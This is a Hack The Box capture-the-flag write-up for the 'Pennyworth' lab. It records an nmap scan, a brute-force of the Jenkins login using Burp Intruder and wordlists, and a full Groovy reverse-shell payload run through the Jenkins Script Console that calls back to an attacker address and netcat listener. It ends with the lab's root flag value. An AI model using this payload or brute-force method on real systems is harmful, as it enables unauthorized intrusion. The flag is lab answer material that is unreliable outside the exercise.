# Hack The Box - Pennyworth

Difficulty: Very Easy  
OS: Linux  
IP: TARGET.IP  

---

# 1. Reconnaissance

## Nmap scan

Command:

nmap -sC -sV -p- TARGET.IP

Result:

PORT     STATE SERVICE VERSION  
8080/tcp open  http    Jetty 9.4.39.v20210325  

Notes:

- HTTP service running on port 8080  
- Jenkins instance detected  

---

# 2. Enumeration

## Web enumeration

Visit website:

http://TARGET.IP:8080/login  

Findings:

- Jenkins login panel  
- potential credentials field  
- brute force possible  

Directory brute force:

Tool used:

Burp Suite Intruder  

Payloads:

- top-usernames-shortlist.txt  
- 500-worst-passwords.txt  

Findings:

- response length for `root:password` differed from others  
- successful login obtained  

---

## Service enumeration

Service:

Jenkins running on port 8080  

Notes:

- Script Console available  
- uses Groovy scripting  

---

# 3. Exploitation

Vulnerability discovered:

Groovy Script Execution (Jenkins Script Console → RCE)  

Payload used:

String host="10.0.0.1"; 
int port=4242; 
String cmd="cmd.exe"; 
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try {p.exitValue(); break;} catch (Exception e){}
};
p.destroy();
s.close();

Adaptation:

- changed `cmd.exe` → `/bin/bash` (Linux target based on Task 7)

Reverse shell:

Command:

nc -lvnp 4242  

Result:

- reverse shell obtained  

---

# 4. Privilege Escalation

Check:

whoami  

Result:

root  

No privilege escalation required  

---

# 5. Flags

Root flag:

cat /root/flag.txt  

Result:

9cdfb439c7876e703e307864c9167a15  

---

# 6. Lessons Learned

- Jenkins Script Console is a critical RCE vector  
- Burp Intruder is effective for brute force attacks  
- response length analysis can reveal valid credentials  
- always verify target OS before executing payloads  
- reverse shells are a key post-exploitation technique  

---

# Tools Used

- nmap  
- Burp Suite (Intruder)  
- netcat  
- SecLists  
- PayloadsAllTheThings  

---

# References

- https://github.com/swisskyrepo/PayloadsAllTheThings  
- https://github.com/danielmiessler/SecLists  
- https://gtfobins.github.io  
